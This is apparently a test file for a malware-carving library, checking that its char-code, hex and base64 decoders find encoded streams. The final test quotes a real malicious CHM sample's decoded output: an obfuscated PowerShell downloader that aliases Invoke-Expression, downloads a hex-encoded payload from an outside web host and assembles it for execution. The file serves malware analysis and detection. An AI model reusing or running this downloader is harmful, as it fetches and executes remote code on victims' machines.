from malcarve.streams import ascii


def test_charcodes():
    d = ascii.ChrDecoder('charcodes')
    s = list(d.decode(b'>LOAD "*",8,1 any c64 fans?'))
    assert len(s) == 0

    s = list(d.decode(b'123,255,1,23,67,90,0,0,0,0'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 0
    assert s['encoding'] == 'charcodes'

    s = list(d.decode(b'asdasdjlk 123,255,1,23,67,90,0,0,0,0; asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk 123,255,1,23,67,90,0,0,0,0; asd \ndsdasd 123,255,1,23,67,90,0,0,0,1'))
    assert len(s) == 2
    s0 = s[0]
    assert s0['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s0['offset'] == 10
    s1 = s[1]
    assert s1['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x01'
    assert s1['offset'] == 50
 
    s = list(d.decode(b'asdasdjlk 123.255.1.23.67.90.0.0.0.0; asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk 123, 255, 1, 23, 67, 90, 0, 0, 0, 0; asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk Chr(123), Chr(255), Chr(1), Chr(23), Chr(67), Chr(90), Chr(0), Chr(0), Chr(0), Chr(0); asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10

    s = list(d.decode(b'asdasdjlk = Chr(123) & Chr(255) & Chr(1) & Chr(23) & Chr(67) & Chr(90) & Chr(0) & Chr(0) & Chr(0) & Chr(0) asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 12

    # cheeky oblique rat docs
    s = list(d.decode(b'asdasdjlk 123O255O1O23O67O90O0O0O0O0 asd \ndsdasd'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x7b\xff\x01\x17\x43\x5a\x00\x00\x00\x00'
    assert s['offset'] == 10


def test_hex():
    d = ascii.HexDecoder('base16')
    # TODO: how to distinguish char codes from hex
    #s = list(d.decode(b'123,255,1,23,67,90,0,0,0,0'))
    #assert len(s) == 0

    s = list(d.decode(b'12,25,1f,23,67,90,00,00,00,00'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00'
    assert s['offset'] == 0
    assert s['encoding'] == 'base16'

    s = list(d.decode(b'ZZ12251f23679000000000ZZ'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00'
    assert s['offset'] == 2
    assert s['encoding'] == 'base16'

    s = list(d.decode(b'ZZ12251f23679000000000ZZZZ12251f23679000000001ZZ'))
    assert len(s) == 3 # each hex run separate and also a combined output
    s0 = s[0]
    assert s0['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00'
    assert s0['offset'] == 2
    assert s0['encoding'] == 'base16'

    s1 = s[1]
    assert s1['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x01'
    assert s1['offset'] == 26
    assert s1['encoding'] == 'base16'

    s2 = s[2]
    assert s2['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x01'
    assert s2['offset'] == 2
    assert s2['encoding'] == 'base16'

    s = list(d.decode(b'12251f23679000000000\r\n12251f23679000000001\r\n'))
    assert len(s) == 1 # whitespace is ignored to produce one run of hex
    s0 = s[0]
    assert s0['stream'] == b'\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x00\x12\x25\x1f\x23\x67\x90\x00\x00\x00\x01'
    assert s0['offset'] == 0
    assert s0['encoding'] == 'base16'

    # don't support mixed case
    s = list(d.decode(b'ABcedf236AA000000000'))
    assert len(s) == 0

def test_base64():
    d = ascii.B64Decoder('base64')
    s = list(d.decode(b'123,255,1,23,67,90,0,0'))
    assert len(s) == 0

    s = list(d.decode(b'QXJlIHlvdSBlbnRlcnRhaW5lZCE/'))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'Are you entertained!?'
    assert s['offset'] == 0
    assert s['encoding'] == 'base64'

    s = list(d.decode(b'\x01\x02;;QXJlIHlvdSBlbnRlcnRhaW5lZCE/;;='))
    assert len(s) == 1
    s = s[0]
    assert s['stream'] == b'Are you entertained!?'
    assert s['offset'] == 4
    assert s['encoding'] == 'base64'


def test_joined_hex():
    """From CHM b4d712b67895eed2a5b8e382632ce119dbfea2b199de96fbc84f83dfdc3b09ed, html obfuscation"""
    html = b"""<script language="javascript">


document.write(unescape(dfjhdf() + jyjhj() + ytyujg() + eweeee()));

function dfjhdf()

{

return
}

function jyjhj()

{

return
}

function ytyujg()

{

return
}

function eweeee()

{

return
}

</script>"""
    # decode joined, % separted hex, reverse and decode ^ separated hex
    d = ascii.HexDecoder('base16')
    s = list(d.decode(html))
    assert len(s) == 5 # 4 chunks and one combined
    s = s[4]
    assert len(s['stream']) == 2599
    assert s['offset'] == 133
    assert s['encoding'] == 'base16'

    # manually do the reverse for test
    s2 = list(d.decode(s['stream'][::-1]))

    content = [x['stream'] for x in s2]
    assert b"""$Tbone=\'>EX\'.replace(\'>\',\'I\');sal M $Tbone;do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);$p22 = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $p22;$tty=\'(New-\'+\'Obje\'+\'ct Ne\'+\'t.We\'+\'bCli\'+\'ent)\'|M;[void] [System.Reflection.Assembly]::LoadWithPartialName(\'Microsoft.VisualBasic\');$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,\'DownloadString\',[Microsoft.VisualBasic.CallType]::Method,\'http://physicaltherapy.gr/D5.jpg\');$asciiChars= $mv.split(\'^\') |ForEach-Object {[char][byte]"0x$_"};$asciiString= $asciiChars -join \'\'|M""" in content
